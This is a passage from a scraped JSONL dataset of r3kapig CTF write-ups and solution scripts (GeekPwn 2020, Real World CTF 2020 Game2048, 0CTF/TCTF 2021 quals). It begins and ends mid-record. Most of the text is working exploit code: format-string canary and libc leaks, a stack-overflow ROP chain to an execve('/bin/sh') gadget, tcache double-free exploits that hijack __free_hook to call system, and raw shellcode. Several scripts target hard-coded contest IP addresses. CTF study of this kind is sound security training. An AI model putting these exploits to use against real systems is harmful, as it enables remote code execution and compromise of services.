0xff)\n                print hex(v19)\n                keys4 = v19\n                s5 = chr(b)\n                s6 = chr(a)\n    blocks += s0 + s1 + s2 + s3 + s4 + s5 + s6 + s7\n    # print blocks\n    print k\n    keys = key_tmp[k]\n    # raw_input()\n\n\n    for j in range(27 , 128):\n        a = i\n        b = j\n        v19 = ((a | (b << 8)) ^ 0xFFFFBF9E)\n        dest1 = (v19 ^ keys) & 0xffff\n        if dest1 == 0x5c09: # \n            keys4 = v19\n            s5 = chr(b)\n            s6 = chr(a)\n            print chr(a) , chr(b) \n\n\n    for j in range(27 , 128):\n        a = i\n        b = j\n        v19 = ((a | (b << 8)) ^ 0xFA2C)\n        dest1 = (v19 ^ keys) & 0xffff\n        if dest1 == 0x1fba:\n            # print hex((v19 ^ 0x51e3) & 0xff)\n            # print hex(v19)\n            keys4 = v19\n            s5 = chr(b)\n            s6 = chr(a)\n            print chr(a) , chr(b) \n\n\n    candidate = ''.join(it)\n    flag = start + candidate + end\n    md5sum = md5(flag.encode()).hexdigest()\n    if md5sum.startswith(hash_prefix):\n        print(f'Flag: flag{{{flag}}}')\n        break\n", "tools": ["python", "gdb", "radare2"], "file_path": "temp_repos\\r3kapig_writeup\\20200714-geekpwn\\README.md", "file_size": 70730, "scraped_at": "2025-10-26T18:19:26.012127"}
{"id": "r3kapig_writeup_Real_World_CTF_2020_Game2048_Writeup", "team": "r3kapig", "repo": "writeup", "challenge_name": "Real World CTF 2020 Game2048 Writeup", "attack_type": "Reverse", "writeup": "# Real World CTF 2020 Game2048 Writeup\n\n## Introduction\n\nThis is @[Anciety](https://github.com/Escapingbug) from [team r3kapig](https://r3kapig.com/)! We have achieved #7 in [Real World CTF](https://realworldctf.com/rank) this year. The experience is quite nice, although we have completed the challenge in a hard way.. Let's get into the hard way 2048!\n\n## Writeup\n\n### The Challenge\n\nThe challenge is a web server, it has functionalities below:\n\n- register: register a new user, after registration, we will be directed to the 2048 page\n- login: login into the 2048 page\n- 2048: the game, at route \"/2048/index.html\", the 2048 is static but require login first. The authentication is encoded in cookie, in a form of \"name; pass\", for example, \"admin; admin\" for username \"admin\" and password \"admin\". So you can direct use the cookie to get in after registration.\n- submit: a hidden functionality, one can submit a comment, it will be remembered and saved to the per-user storage. Once submitted, the next time you browse the submit page, the comment will be there by default. And there's a default string when you first time (haven't submitted any thing yet) browse the page.\n\nThe default submit page is:\n\n![submit_page](./pngs/submit.png)\n\nAnd the implementation is based on libCoroutine, so it is a single thread but coroutine implementation. The program is written in C++, so is a little bit confusing to reverse, but once you got the overall structure, it can be a lot simpler.\n\nFirst there's a routing initialization:\n\n![routing](./pngs/route.png)\n\nAnd the real implementation is in each object's `process` function, for example, there's a `submit::process`.\n\nThe intended solution is not that complex, let's speak about the intended solution first.\n\nThe bug resides in the submit implementation. A user's username and password is recorded in a table, and to access submit page, one needs to login (providing username and password to cookie). So, the submit is implemented by recording the submitted content in the user struct.\n\n![submit_implementation](./pngs/submit_impl.png)\n\nAlso, when a user already has the comment, it will be freed first, and read the new one:\n\n![submit_free](./pngs/submit_impl2.png)\n\nBut note that, the reading part is implemented by `AIO::read`, and it can be blocked if you don't provide any input.\n\nSo, there's a double free now:\n\n1. free one, block the whole procedure at the read\n2. use another connection to do the free again, since when the read is blocked, the comment of such user is not set to zero (this happens afterwards), we get a legit double free\n\nThe libc given is of version `2.31`, which has tcache support, now we can leverage that to complete the double free exploit.\n\nThis is the intended solution I suppose, since it is easy to write a exploit. Now let's get to the hard part.\n\n### Do That in A Hard Way\n\nSince during the contest, we have totally ignored this double free, we found three more bugs in the program:\n\nFirst, a stack overflow in http parse (to be more specific, `add_get_param`):\n\n![stack_overflow](./pngs/stackoverflow.png)\n\nSince the `strncpy` size is actually calculated from the src string itself, they are just working like `strcpy`. However, the `tmp1` and `tmp2` are not actually used (Note that IDA has a problem decompiling try-catch block, it can **skip parts of the function implicitly without any warning**. But even we inspect disassembly, they are still not used). This might be a programming error (maybe the author intended to search on `tmp1` and `tmp2` instead of key and value).\n\nBut the program is protected by canary. So this stack overflow itself is not interesting.\n\nLet's get to the second one, a string forgot to be null terminated. The bug is in `parseHelper::render`:\n\n![notnullterminated](./pngs/notnullterminated.png)\n\nThe `fread` just read the content of the template, but not null terminated. Also, the chunk is not cleared first. So if the chunk is full of user controlled text, we can concat interesting bytes after the read out template.\n\nAnd here comes a bug out of a bug, because of this, we have a further format string vulnerability:\n\n![format](./pngs/format.png)\n\nAnd the third one, the `comment` is not null terminated as well:\n\n![decode_null](./pngs/decode_null.png)\n\nThese three bugs by itself cannot do anything interesting (except the comment, it can print out heap address and libc address, but again, leaking is not enough to exploit anything). But combining them, we got our profit..\n\n### Combine The Bugs\n\nSince we have a stack overflow, our thought goes to trigger it by leaking the canary out. And gladly, we have two leaking bugs, a format string leaking and a leak on heap. However, non of them can leak canary out.\n\nActually, if you think about it, the format string should leak canary out if the format string vulnerability is a normal one, but unfortunately it is not. Because the format string vulnerability is caused by concat garbage bytes after the template, we need to fi", "solution_code": "def leak_canary():\n    register()\n    register('fuck')\n\n    number = 0x3000 + 0x30 # v1 <- remote\n    payload = 'x' * (number - 0x18) + 'x' * 12 + '%55$p' + 'x' * (10-3) # working! for canary remote\n\n    submit(payload, user='fuck')\n    submit('a' * 0x100)\n    submit('a' * (0x10), user='fuck')\n    view_submit(user='fuck')\n\ndef leak_canary():\n    register()\n    register('fuck')\n    register('empty')\n\n    number = 0x3000 + 0x30 # v1 <- remote\n    payload = 'x' * (number - 0x18) + 'x' * 12 + '%55$p' + 'x' * (10-3) # working! for canary remote\n\n    submit(payload, user='fuck')\n    submit('a' * 0x100)\n    submit('a' * (0x10), user='fuck')\n    view_submit(user='empty')\n\ndef leak_libc():\n    register()\n    for i in range(10):\n        submit('a'.ljust(0x1000, 'b'), False)\n    view_submit()\n\n\n    submit('a')\n    res = view_submit()\n    text_start = b'<textarea id=\"compose-textarea\" class=\"form-control\" style=\"height: 300px\" name=\"word\">'\n    idx = res.content.find(text_start) + len(text_start) + 1\n    content = res.content[idx:].strip(b' ').split(b'\\n')[0]\n    libc_addr = u64(content.ljust(8, b'\\x00'))\n    libc_base = libc_addr - 0x1ebb61\n    print(hex(libc_addr))\n    print(hex(libc_base))\n\n$ one_gadget libc.so.6 \n0xe6e73 execve(\"/bin/sh\", r10, r12)\nconstraints:\n  [r10] == NULL || r10 == NULL\n  [r12] == NULL || r12 == NULL\n\n0xe6e76 execve(\"/bin/sh\", r10, rdx)\nconstraints:\n  [r10] == NULL || r10 == NULL\n  [rdx] == NULL || rdx == NULL\n\n0xe6e79 execve(\"/bin/sh\", rsi, rdx)\nconstraints:\n  [rsi] == NULL || rsi == NULL\n  [rdx] == NULL || rdx == NULL\n\n#!/usr/bin/env python3 \nimport requests \nfrom pwn import * \nimport sys \nimport urllib.parse \n \n#url = 'http://localhost:39267' \nurl = 'http://54.176.255.241:33717' \nsubmit_url = url + '/submit' \nsubmit_page = url + '/submit.html' \nregister_url = url + '/register' \n \nlibc_base = 0x7f6b1b06c000 \ncanary = 0xfd15c59a46b75400  \n \n \none_gadget = 0xE6C84 \n#one_gadget = 0xe6e79 \n \ndef submit(content, log=True, user='admin'): \n    data = { \n        'word': content \n    } \n    r = requests.post(submit_url, data=data, cookies={'name': user, 'pass': user}) \n    if log: \n        print(r.text) \n    return r \n \ndef view_submit(log=True, user='admin'): \n    r = requests.get(submit_page, cookies={'name': user, 'pass': user}) \n    if log: \n        print(r.text) \n    return r \n \ndef register(user='admin', log=False): \n    r = requests.get(register_url + '?name={user}&passwd={user}&re_passwd={user}'.format(user=user)) \n    if log: \n        print(r.text) \n \n \ndef leak_libc(): \n    register() \n    for i in range(10): \n        submit('a'.ljust(0x1000, 'b'), False) \n    view_submit() \n \n \n    submit('a') \n    res = view_submit() \n    text_start = b'<textarea id=\"compose-textarea\" class=\"form-control\" style=\"height: 300px\" name=\"word\">' \n    idx = res.content.find(text_start) + len(text_start) + 1 \n    content = res.content[idx:].strip(b' ').split(b'\\n')[0] \n    libc_addr = u64(content.ljust(8, b'\\x00')) \n    libc_base = libc_addr - 0x1ebb61 \n    print(hex(libc_addr)) \n    print(hex(libc_base)) \n    libc_base = libc_addr - 0x1ec261 \n    print(hex(libc_base)) \n \n \ndef leak_canary(): \n    register() \n    register('fuck') \n    register('empty') \n \n    number = 0x3000 + 0x30 # v1 <- remote \n    payload = 'x' * (number - 0x18) + 'x' * 12 + '%55$p' + 'x' * (10-3) # working! for canary remote \n \n    submit(payload, user='fuck') \n    submit('a' * 0x100) \n    submit('a' * (0x10), user='fuck') \n    view_submit(user='empty') \n \ndef main(): \n    rop = p64(one_gadget + libc_base) \n    payload_key = 'a' * 0x100 + 'b' * 0x100 + 'a' * 8 + 'a' + urllib.parse.quote(p64(canary)[1:]) + 'x' * 24 + urllib.parse.quote(rop) \n    payload_value = 'p' * 0x108 \n    exp_url = url + '?' + payload_key + '=' + payload_value \n    r = requests.get(exp_url) \n \nif __name__ == '__main__': \n    op = '' \n    if len(sys.argv) >= 2: \n        op = sys.argv[1] \n \n    if op == 'reg': \n        register() \n    elif op == 'canary': \n        leak_canary() \n    elif op == 'libc': \n        leak_libc() \n    else: \n        main() \n\n    submit('a')\n    res = view_submit()\n    text_start = b'<textarea id=\"compose-textarea\" class=\"form-control\" style=\"height: 300px\" name=\"word\">'\n    idx = res.content.find(text_start) + len(text_start) + 1\n    content = res.content[idx:].strip(b' ').split(b'\\n')[0]\n    libc_addr = u64(content.ljust(8, b'\\x00'))\n    libc_base = libc_addr - 0x1ebb61\n    print(hex(libc_addr))\n    print(hex(libc_base))\n\n\n    data = { \n        'word': content \n    } \n    r = requests.post(submit_url, data=data, cookies={'name': user, 'pass': user}) \n    if log: \n        print(r.text) \n    return r \n\n\n    r = requests.get(submit_page, cookies={'name': user, 'pass': user}) \n    if log: \n        print(r.text) \n    return r \n\n\n    r = requests.get(register_url + '?name={user}&passwd={user}&re_passwd={user}'.format(user=user)) \n    if log: \n        print(r.text) \n\n\n    submit('a') \n    res = view_submit() \n    text_start = b'<textarea id=\"compose-textarea\" class=\"form-control\" style=\"height: 300px\" name=\"word\">' \n    idx = res.content.find(text_start) + len(text_start) + 1 \n    content = res.content[idx:].strip(b' ').split(b'\\n')[0] \n    libc_addr = u64(content.ljust(8, b'\\x00')) \n    libc_base = libc_addr - 0x1ebb61 \n    print(hex(libc_addr)) \n    print(hex(libc_base)) \n    libc_base = libc_addr - 0x1ec261 \n    print(hex(libc_base)) \n", "tools": ["python", "ida"], "file_path": "temp_repos\\r3kapig_writeup\\20210111-rwctf-game2048\\README.md", "file_size": 12649, "scraped_at": "2025-10-26T18:19:26.596365"}
{"id": "r3kapig_writeup_0CTF_TCTF_2021_Quals_Writeup", "team": "r3kapig", "repo": "writeup", "challenge_name": "0CTF/TCTF 2021 Quals Writeup", "attack_type": "Hash", "writeup": "# 0CTF/TCTF 2021 Quals Writeup\n\n## Pwn\n\n### how2mutate\n\n漏洞点在mutate seed函数中\n\n```c\nvoid mutate_seed() {\n    char buf[16];\n    printf(\"index: \");\n    read(0, buf, 4);\n    if (buf[0]>='0' && buf[0]<='9') {\n        int idx = buf[0]-'0';\n        if (seeds[idx]) {\n            run.dynfile->size = seedssz[idx];\n            memcpy(run.dynfile->data, seeds[idx], seedssz[idx]);\n            mangle_mangleContent(&run, 1);\n            seedssz[idx] = run.dynfile->size;\n            seeds[idx] = util_Realloc(seeds[idx], seedssz[idx]);\n            memcpy(seeds[idx], run.dynfile->data, seedssz[idx]);\n        }\n    }\n}\n```\n\n这里的realloc函数的size，也就是seedssz[index]可以为0\n\n```c\nvoid add_seed() {\n    int i=0;\n    while (i<10 && seeds[i]) i++;\n    if (i<10) {\n        printf(\"size: \");\n        scanf(\"%d\", &seedssz[i]);\n        int sz = seedssz[i]+1;\n        if (sz>0 && sz<0x8000) {\n            printf(\"content: \");\n            seeds[i] = util_Calloc(sz);\n            read(0, seeds[i], seedssz[i]);\n        }\n    }\n}\n```\n\n跟进去ida看一下utilrealloc逻辑\n\n```c\nvoid *__fastcall util_realloc(void *ptr, size_t len)\n{\n  void *v2; // r12\n\n  v2 = realloc(ptr, len);\n  if ( !v2 )\n  {\n    if ( (unsigned int)magic > 1 )\n      put_debug_info(2u, \"util_Realloc\", 0x4Bu, 1, \"realloc(%p, %zu)\", ptr, len);\n    free(ptr);\n  }\n  return v2;\n}\n```\n\n这里如果len是0，realloc返回值为0，他再次free就会有个直接的doublefree。\n\n这里注意一下，由于put_debug_info函数会调用localtime相关的函数，第一次调用的时候会打开localtime文件，会调用一个strdup，所以会把上面free掉的chunk拿来用，所以第一次不会触发doublefree，同时他也会把堆地址信息打印出来。\n\n在第二次utilrealloc(ptr,0)的时候就会触发doublefree了，这里面是0x20大小的chunk，tcache直白的doublefree会报错，需要改他的key字段才行，但是现在还没有uaf。\n\n这里需要利用fuzz函数：\n\n```c\n   if (buf[0] == '9') {\n        bool ok=true;\n        for (i=2; i<15; i++) {\n            buf[i] += buf[i-1];\n            if (buf[i] != buf[i+1])\n                ok = false;\n        }\n        if (ok)\n            puts(\"path 8\");\n    }\n    if (buf[0] == '0') {\n        bool ok=true;\n        for (i=2; i<15; i++) {\n            buf[i] -= buf[i-1];\n            if (buf[i] != buf[i+1])\n                ok = false;\n        }\n        if (ok)\n            puts(\"path 9\");\n    }\n```\n\n可以看到如果第一个字节为0或者9就会改变buf中的内容。在主函数中是开启一个线程的方式调用的。\n\n```c\nelse if (buf[0] == '6') {\n            subproc_runThread(&hfuzz, &fuzzthread, tofuzz, false);\n```\n\n所以说思路就是利用这个race condition来修改key字段，达到uaf效果。\n\n最开始的思路是先输入个0或者9，然后通过mutate变异，给他size弄成0.后来在调试的时候发现如果size是0了，会出一个noinput异常，不会触发doublefree。\n\n所以改变一下思路，我们先free一个结尾是0x30（也就是字符0）的chunk放到tcache中，然后我们第一次free后fd就被写入了这个地址，然后这时候子线程就会改变fd以及后面的key值，第二次free时候就有uaf了。\n\n有了uaf后就是个极其简单的堆题目了，具体做法就不在这里赘述了。\n\nexp：\n\n```python\nfrom pwn import *\ncontext(log_level='debug',os='linux',arch='amd64')\n#context.terminal = ['tmux', 'splitw', '-h']\nmyelf = ELF(\"./how2mutate\")\n#ld    = ELF(\"./ld-2.30.so\")\n#libc = ELF('./libc-2.31.so')\nlibc = ELF('/usr/lib/x86_64-linux-gnu/libc-2.31.so')\nlocal = True\nload_lib = False\nio = process(argv = [myelf.path])\n'''if not local:\n        io = remote('124.16.75.162',31022)\nelif load_lib :\n        io = process(argv=[ld.path,myelf.path],env={\"LD_PRELOAD\":'./libc-2.30.so'})\n        gdb_text_base = int(os.popen(\"pmap {}| awk '{{print $1}}'\".format(io.pid)).readlines()[1], 16)\n        gdb_libc_base = int(os.popen(\"pmap {}| grep libc | awk '{{print $1}}'\".format(io.pid)).readlines()[0], 16)\n        \nelse:\n        io = process(argv = [myelf.path])#,env={\"LD_PRELOAD\":'./libc-2.31.so'})\n        gdb_text_base = int(os.popen(\"pmap {}| awk '{{print $1}}'\".format(io.pid)).readlines()[1], 16)\n        gdb_libc_base = int(os.popen(\"pmap {}| grep libc | awk '{{print $1}}'\".format(io.pid)).readlines()[0], 16)\ndef debug(addr=0,cmd='',PIE=False):\n    if PIE: addr = gdb_text_base + addr\n    log.warn(\"breakpoint_addr --> 0x%x\" % addr)\n    gdb.attach(io,\"b *{}\\nc\\n\".format(hex(addr))+cmd)'''\ndef p():\n        gdb.attach(io)\n        raw_input()        \ndef choice(c):\n        io.recvuntil('> ')\n        io.sendline(str(c))\ndef add(sz,content):\n        choice(1)\n        io.recvuntil('size: ')\n        io.sendline(str(sz))\n        io.recvuntil('content: ')\n        io.send(content)\ndef show():\n        choice(3)\n        \ndef delete(index):\n        choice(4)\n        io.recvuntil('index: ')\n        io.sendline(str(index))\ndef mutate(index):\n        choice(2)\n        io.recvuntil('index: ')\n        io.sendline(str(index))\ndef setmutate(num):\n        choice(5)\n        io.recvuntil('mutationsPerRun: ')\n        io.sendline(str(num))\ndef fuzz():\n        choice(6)\ndef exp():\n        #\n        add(0,'')#0\n        #gdb.attach(io,'b fopen')\n        setmutate(0)\n        mutate(0)\n\n        #\n        io.recvuntil('util_Realloc():75 realloc(')\n        heapleak = int(io.recv(14),16)\n        log.success(hex(heapleak))\n        heap_base = heapleak - 0x13a0\n        log.success(hex(heap_base))\n        \n        \n        add(0,'')#0\n        add(0x480,'/bin/sh\\x00')#1\n        add(0,'')#2\n        \n        delete(2)\n        fuzz()\n        mutate(0)\n\n        target = heap_base + 0x1340\n        unsorted = heap_base + 0x1a30 -0x490\n        delete(1)\n        add(8,p64(targe", "solution_code": "from pwn import *\ncontext(log_level='debug',os='linux',arch='amd64')\n#context.terminal = ['tmux', 'splitw', '-h']\nmyelf = ELF(\"./how2mutate\")\n#ld    = ELF(\"./ld-2.30.so\")\n#libc = ELF('./libc-2.31.so')\nlibc = ELF('/usr/lib/x86_64-linux-gnu/libc-2.31.so')\nlocal = True\nload_lib = False\nio = process(argv = [myelf.path])\n'''if not local:\n        io = remote('124.16.75.162',31022)\nelif load_lib :\n        io = process(argv=[ld.path,myelf.path],env={\"LD_PRELOAD\":'./libc-2.30.so'})\n        gdb_text_base = int(os.popen(\"pmap {}| awk '{{print $1}}'\".format(io.pid)).readlines()[1], 16)\n        gdb_libc_base = int(os.popen(\"pmap {}| grep libc | awk '{{print $1}}'\".format(io.pid)).readlines()[0], 16)\n        \nelse:\n        io = process(argv = [myelf.path])#,env={\"LD_PRELOAD\":'./libc-2.31.so'})\n        gdb_text_base = int(os.popen(\"pmap {}| awk '{{print $1}}'\".format(io.pid)).readlines()[1], 16)\n        gdb_libc_base = int(os.popen(\"pmap {}| grep libc | awk '{{print $1}}'\".format(io.pid)).readlines()[0], 16)\ndef debug(addr=0,cmd='',PIE=False):\n    if PIE: addr = gdb_text_base + addr\n    log.warn(\"breakpoint_addr --> 0x%x\" % addr)\n    gdb.attach(io,\"b *{}\\nc\\n\".format(hex(addr))+cmd)'''\ndef p():\n        gdb.attach(io)\n        raw_input()        \ndef choice(c):\n        io.recvuntil('> ')\n        io.sendline(str(c))\ndef add(sz,content):\n        choice(1)\n        io.recvuntil('size: ')\n        io.sendline(str(sz))\n        io.recvuntil('content: ')\n        io.send(content)\ndef show():\n        choice(3)\n        \ndef delete(index):\n        choice(4)\n        io.recvuntil('index: ')\n        io.sendline(str(index))\ndef mutate(index):\n        choice(2)\n        io.recvuntil('index: ')\n        io.sendline(str(index))\ndef setmutate(num):\n        choice(5)\n        io.recvuntil('mutationsPerRun: ')\n        io.sendline(str(num))\ndef fuzz():\n        choice(6)\ndef exp():\n        #\n        add(0,'')#0\n        #gdb.attach(io,'b fopen')\n        setmutate(0)\n        mutate(0)\n\n        #\n        io.recvuntil('util_Realloc():75 realloc(')\n        heapleak = int(io.recv(14),16)\n        log.success(hex(heapleak))\n        heap_base = heapleak - 0x13a0\n        log.success(hex(heap_base))\n        \n        \n        add(0,'')#0\n        add(0x480,'/bin/sh\\x00')#1\n        add(0,'')#2\n        \n        delete(2)\n        fuzz()\n        mutate(0)\n\n        target = heap_base + 0x1340\n        unsorted = heap_base + 0x1a30 -0x490\n        delete(1)\n        add(8,p64(target))#0 3tcache remain\n        add(8,p64(unsorted))#1 2tcache remain\n        add(8,p64(unsorted))#2\n        show()\n\n        io.recvuntil('6: ')\n        leak = u64(io.recv(6)+b'\\x00\\x00')\n        libc_base = leak - 0x1ebbe0\n        sys = libc_base + libc.symbols['system']\n        frh = libc_base + libc.symbols['__free_hook']\n        log.success(hex(libc_base))\n\n        add(0,'')#3 \n\n        add(0x60,'/bin/sh\\x00')#4\n        add(0,'')#5\n\n        delete(5)\n        fuzz()\n        mutate(3)\n        add(8,p64(frh))\n        add(8,p64(sys))\n        add(8,p64(sys))\n        delete(4)\n\n\n        io.interactive()\nif __name__ == '__main__':\n        io = remote('111.186.59.27', 12345)\n        exp()\n        while(1):\n                try:\n                        #io = process(argv = [myelf.path])\n                        io = remote('111.186.59.27', 12345)\n                        exp()\n                except Exception as e:\n                        print(\"failed\")\n                        io.close()\n#flag{ANd_1iK3_7he_cat_I_hAVe_niN3_tiMe5_7o_d1e}\n\nfrom pwn import *\n\ncontext.log_level = \"debug\"\ncontext.arch = \"amd64\"\ncontext.os = \"linux\"\n\nIP, PORT = \"111.186.59.29\", 10087\n\np = remote(IP, PORT)\n\ndef patch_data(addr, size, data):\n    p.sendlineafter(\"?: \\x00\", \"3\")\n    p.sendafter(\"addr: \\x00\", p64(addr))\n    p.sendafter(\"size: \\x00\", p64(size))\n    p.sendafter(\"data: \\x00\", data)\n\nmy_code = b\"\\x90\"\np.send(my_code)\n\nCODE = 0xdeadbeef000\nSTACK = 0xbabecafe000\npatch_data(STACK, 8, p64(CODE))\n\np.sendlineafter(\"?: \\x00\", \"1\")\n\npatch_data(STACK, 8, p64(CODE+0x1000))\nADMIN = b'\\xb9\\x10\\x00\\x00\\x00\\x48\\x8d\\x15\\x37\\x00\\x00\\x00\\x31\\xc0\\xbe\\x01\\x00\\x00\\x00\\xbf\\x01\\x00\\x00\\x00\\x48\\x83\\xec\\x08\\xe8\\x5f\\x00\\x00\\x00\\x48\\x8d\\x05\\x2b\\x00\\x00\\x00\\x48\\xa3\\x33\\xe2\\xaf\\xec\\xab\\x0b\\x00\\x00\\x48\\x83\\xc4\\x08\\x48\\xbf\\x00\\xe0\\xaf\\xec\\xab\\x0b\\x00\\x00\\xff\\x67\\x08\\x49\\x6d\\x61\\x67\\x69\\x6e\\x61\\x74\\x69\\x6f\\x6e\\x20\\x69\\x73\\x20\\x00\\x6b\\x33\\x33\\x6e\\x6c\\x61\\x62\\x65\\x63\\x68\\x6f\\x20\\x27\\x6d\\x6f\\x72\\x65\\x20\\x69\\x6d\\x70\\x6f\\x72\\x74\\x61\\x6e\\x74\\x20\\x74\\x68\\x61\\x6e\\x20\\x6b\\x6e\\x6f\\x77\\x6c\\x65\\x64\\x67\\x65\\x2e\\x27\\x00\\x48\\x89\\xf8\\x48\\x89\\xf7\\x48\\x89\\xd6\\x48\\x89\\xca\\x4d\\x89\\xc2\\x4d\\x89\\xc8\\x4c\\x8b\\x4c\\x24\\x08\\x0f\\x05\\xc3'.ljust(0x1000, b'\\xf4')\npayload = ADMIN[:0x53] + b\"k33nlab/readflag\\x00\"\npatch_data(CODE+0x1000, len(payload), payload)\n\np.sendlineafter(\"?: \\x00\", \"2\")\n\np.interactive()\n# flag{Let's_look_forward_to_unicorn2}\n\ndef ctf_hook(uc, address, size, user_data):\n    rsp = uc.reg_read(UC_X86_REG_RSP)\n    rip = uc.reg_read(UC_X86_REG_RIP)\n    print(\"rip ==> 0x{:x}, rsp ==> 0x{:x}\".format(rip, rsp))\n\nuc.hook_add(UC_HOOK_CODE, ctf_hook, None, 1, 0)\n\nfrom pwn import *\nfrom capstone import *\n\nCODE = 0xdeadbeef000\nSTACK = 0xbabecafe000\nadmin_offset = CODE + 0x6b - 5\n\nmd = Cs(CS_ARCH_X86, CS_MODE_64)\nmd.detail = True\n\nADMIN = b'\\xb9\\x10\\x00\\x00\\x00\\x48\\x8d\\x15\\x37\\x00\\x00\\x00\\x31\\xc0\\xbe\\x01\\x00\\x00\\x00\\xbf\\x01\\x00\\x00\\x00\\x48\\x83\\xec\\x08\\xe8\\x5f\\x00\\x00\\x00\\x48\\x8d\\x05\\x2b\\x00\\x00\\x00\\x48\\xa3\\x33\\xe2\\xaf\\xec\\xab\\x0b\\x00\\x00\\x48\\x83\\xc4\\x08\\x48\\xbf\\x00\\xf8\\xee\\xdb\\xea\\x0d\\x00\\x00\\xff\\x67\\x08\\x49\\x6d\\x61\\x67\\x69\\x6e\\x61\\x74\\x69\\x6f\\x6e\\x20\\x69\\x73\\x20\\x00\\x6b\\x33\\x33\\x6e\\x6c\\x61\\x62\\x65\\x63\\x68\\x6f\\x20\\x27\\x6d\\x6f\\x72\\x65\\x20\\x69\\x6d\\x70\\x6f\\x72\\x74\\x61\\x6e\\x74\\x20\\x74\\x68\\x61\\x6e\\x20\\x6b\\x6e\\x6f\\x77\\x6c\\x65\\x64\\x67\\x65\\x2e\\x27\\x00\\x48\\x89\\xf8\\x48\\x89\\xf7\\x48\\x89\\xd6\\x48\\x89\\xca\\x4d\\x89\\xc2\\x4d\\x89\\xc8\\x4c\\x8b\\x4c\\x24\\x08\\x0f\\x05\\xc3'.ljust(0x1000, b'\\xf4')\nprint(\"length of ADMIN => \", len(ADMIN))\n\n# 0xdeadbeef067:    adc    al, byte ptr [rax]\n# 0xdeadbeef069:    add    byte ptr [rax], al\n# 0x2d pushfq\noffset = 0\nrax = 0xdeadbef0000 + offset\n\nal = ((rax&0xff) + ADMIN[offset])&0xff\nprint(hex(al), hex(ADMIN[offset]))\n\nrax2 = (0xdeadbef0000 & 0xfffffffff00)+al\nprint(hex(rax2))\n\nif rax2 > (0xdeadbef0000+0x32):\n    if rax2 not in range(0xdeadbef0000+0x80, 0xdeadbef0000+0x9b):\n        print(\"-----nonono-----\")\n        exit()\n    \ntmp = bytearray(ADMIN)\ntmp[rax2-0xdeadbef0000] = (tmp[rax2-0xdeadbef0000]+al)&0xff\nADMIN = bytes(tmp)\n#print(al, ADMIN[offset])\n\n\nprint(\"---------- ADMIN CODE ----------\")\nfor i in md.disasm(ADMIN[:0x45], CODE+0x1000):\n    print(\"0x%x:\\t%s\\t%s\" %(i.address, i.mnemonic, i.op_str))\n\nprint()\nfor i in md.disasm(ADMIN[0x80:0x9a], CODE+0x1000+0x80):\n    print(\"0x%x:\\t%s\\t%s\" %(i.address, i.mnemonic, i.op_str))\n\nprint(hex(rax2))\n\nfrom pwn import *\n\ncontext.log_level = \"debug\"\ncontext.arch = \"amd64\"\ncontext.os = \"linux\"\n\nIP, PORT = \"111.186.59.29\", 10088\n\np = remote(IP, PORT)\n\ndef patch_data(addr, size, data):\n    p.sendlineafter(\"?: \\x00\", \"3\")\n    p.sendafter(\"addr: \\x00\", p64(addr))\n    p.sendafter(\"size: \\x00\", p64(size))\n    p.sendafter(\"data: \\x00\", data)\n\nidx = 0x9a\nmy_code = asm('''\n    mov rax, {};\n    mov r9, 0xbabecafe1e6;\n    mov r8, 0xbabecafe000;\n    mov rbx, 0xdeadbeef067;\n    mov qword ptr [rsp], rbx;\n    jmp qword ptr [rsp];\n'''.format(0xdeadbef0000+idx))\n\np.send(my_code)\n\n\nCODE = 0xdeadbeef000\nSTACK = 0xbabecafe000\n\npayload = b\"k33nlab/readflag\\x00\"\npatch_data(STACK, len(payload), payload)\n\n\np.sendlineafter(\"?: \\x00\", \"2\")\n\np.interactive()\n#flag{Hope_you_enjoyed_the_series}\n\nfrom pwn import *\ncontext.arch='amd64'\ndef cmd(c):\n    p.sendlineafter(\">>\",str(c))def add(name='\\n',c='A\\n'):\n    cmd(1)\n    p.sendafter(\">\",name)\n    p.sendafter(\">\",c)def free(idx):\n    cmd(2)\n    p.sendlineafter(\">\",str(idx))def show(idx):\n    cmd(3)\n    p.sendlineafter(\">\",str(idx))#p=process(\"./pwn\")\np=remote(\"111.186.58.249\",20001)#context.log_level='debug'\ncontext.terminal=['tmux','split','-h']\nadd()\nadd(\"\\x10\"*0x10)\nshow(0)\np.readuntil(b\"\\x10\"*0x10)\nheap=u64(p.readuntil(\" \")[:-1]+b'\\0\\0')-(0x2a0)\nlog.warning(hex(heap))\nfree(0)\nadd()\nadd(\"\\1\\n\")\nadd(\"\\2\\n\")for x in range(7):\n    add('\\6\\n')\nfree(6)\nfree(2)\nfree(0)\nadd('\\x80\\n')\nshow(0)\np.readuntil(\"=> \")\nbase=u64(p.readline()[:-1]+b'\\0\\0')-(0x7ffff7fbade0-0x7ffff7dcf000)\nlog.warning(hex(base))for x in range(6):\n    add('\\2\\n')\nadd('\\7\\n')#*\nfor x in range(3):\n    add('\\6\\n')for x in range(8):\n     add('\\4\\n')for x in range(7):\n    add('\\3\\n')\nfree(3)\nfree(4)\nfree(7)for x in range(6):\n    add('\\2\\n')for x in range(3):\n    add('\\4\\n')\n    free(4)\nadd('\\4\\n')\nfree(0)\nadd('\\n',p64(0x000055555555afd0-0x555555559000+heap)+p64(0x5555555592b0-0x10-0x555555559000+heap)+b'\\n')\nadd('\\2\\n')\nadd('\\0\\n',b'\\0'*0x18+p64(0x21)+p64(base+0x1eeb20)+b'\\n')\nadd()\nadd('\\0\\n',b'/bin/sh\\0'+p64(base+0x55410)+b'\\n')\nfree(0)\np.interactive()\n\nfrom pwn import *#context.log_level='debug'\ncontext.arch='amd64'\ncontext.terminal=['tmux','split','-h']\ndef cmd(c):\n    p.sendlineafter(\": \",str(c))\ndef add(size,c='A'):\n    cmd(1)\n    cmd(size)\n    if(size):\n        p.sendlineafter(\": \",c)\ndef edit(idx,size,c=\"A\"*1):\n    cmd(2)\n    cmd(idx)\n    cmd(size)\n    if(size):\n        p.sendlineafter(\": \",c)\ndef free(idx):\n    cmd(3)\n    cmd(idx)\ndef show(idx):\n    cmd(4)\n    cmd(idx)#p=process('./pwn')\np=remote(\"111.186.59.11\",11124)\nadd(0x10)#0\nadd(0x10)#1\nadd(0x70)#2\nadd(0x10)#3\nedit(0,0x80000000,b\"A\"*0x10+p64(0x21)+p64(0x81)+b'\\0'*0x70+p64(0x81)+p64(0x21)*4+p64(0x21)[:-1])\nfree(1)\nadd(0x10)#1\nshow(2)p.readuntil(\": 